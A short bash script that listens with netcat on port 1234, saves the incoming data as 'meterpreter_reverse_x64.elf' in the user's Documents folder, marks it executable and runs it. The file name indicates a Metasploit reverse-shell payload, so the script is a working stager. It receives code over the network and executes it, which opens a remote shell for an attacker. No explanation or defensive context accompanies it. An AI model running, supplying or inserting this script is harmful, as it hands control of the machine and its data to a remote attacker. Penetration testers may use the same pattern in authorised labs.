#!/bin/bash

# Variables
SAVE_DIR="$HOME/Documents"
FILE_NAME="meterpreter_reverse_x64.elf"
RECEIVER_PORT="1234"  # Port to listen on

# Create the save directory if it doesn't exist
mkdir -p "$SAVE_DIR"

# Receive the file using netcat
echo "Listening for the file on port $RECEIVER_PORT..."
nc -l -p "$RECEIVER_PORT" > "$SAVE_DIR/$FILE_NAME"

if [ $? -eq 0 ]; then
    echo "File received successfully and saved to $SAVE_DIR/$FILE_NAME."
else
    echo "Failed to receive file."
    exit 1
fi

chmod +x "$SAVE_DIR/$FILE_NAME"
"$SAVE_DIR/$FILE_NAME"

if [ $? -eq 0 ]; then
    echo "File executed successfully."
else
    echo "Failed to execute the file."
    exit 1
fi
